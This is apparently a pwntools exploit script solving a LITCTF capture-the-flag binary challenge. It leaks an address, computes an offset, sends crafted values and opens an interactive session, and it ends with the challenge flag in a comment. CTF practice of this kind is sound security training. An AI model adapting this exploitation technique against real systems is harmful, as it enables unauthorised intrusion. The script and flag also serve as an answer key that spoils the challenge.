#!/usr/bin/python3

from pwn import *

exe = ELF('s_patched', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''


                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('litctf.org', 31772)
else:
        p = process(exe.path)

GDB()
leak = int(p.recvline(keepends = False), 16) - 0x50 - 8
sl(str(leak))
sl(str(0x61))
p.interactive()
# LITCTF{very_legitimate_exit_function}